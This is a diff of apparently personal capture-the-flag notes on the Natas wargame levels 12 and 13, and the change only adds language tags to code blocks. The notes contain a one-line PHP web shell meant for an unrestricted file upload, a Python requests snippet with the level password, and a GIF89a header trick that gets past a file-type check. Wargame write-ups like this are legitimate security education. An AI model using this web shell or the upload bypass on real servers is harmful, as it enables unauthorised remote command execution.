@@ -9,13 +9,13 @@ Tags: [[Local File Inclusion & Command Injection]]
 we have a unrestricted file upload functionality 
 
 create a [[php]] file named `revshell.php` with the following contents, we will modify the `c` parameter later 
-```
+```php
 <?php
 	system($_GET['c']);
 ?>
 ```
 
-```
+```python
 import requests
 username = 'natas12'
 password = 'yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'
@@ -40,7 +40,7 @@ similar to natas12, here we have a `php` module named `exif_imagetype` that [[im
 `exif_imagetype` checks for file signatures
 
 we add `GIF89a` at the start of our payload `php` file making the contents of the file as 
-```
+```php
 GIF89a
 <?php
 system($_GET['c']);
